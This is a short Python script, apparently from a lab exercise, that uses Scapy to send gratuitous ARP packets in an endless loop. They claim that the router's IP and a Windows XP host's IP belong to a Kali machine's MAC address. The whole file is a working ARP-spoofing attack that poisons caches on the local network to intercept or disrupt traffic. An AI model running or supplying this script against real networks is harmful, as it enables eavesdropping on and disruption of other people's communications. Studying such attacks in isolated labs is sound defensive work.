from scapy.all import *
from time import sleep

RTR_IP = "10.10.111.1"
XP_IP = "10.10.111.100"
KALI_MAC = "00:00:00:00:00:04"
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

def gratuitous_arp(src_ip):
    arp_spoofing = ARP(psrc=src_ip, pdst=src_ip, hwsrc=KALI_MAC)
    pkt_spoofing = Ether(dst=BROADCAST_MAC) / arp_spoofing
    sendp(pkt_spoofing)

while(True):
    gratuitous_arp(RTR_IP)
    gratuitous_arp(XP_IP)
    sleep(0.5)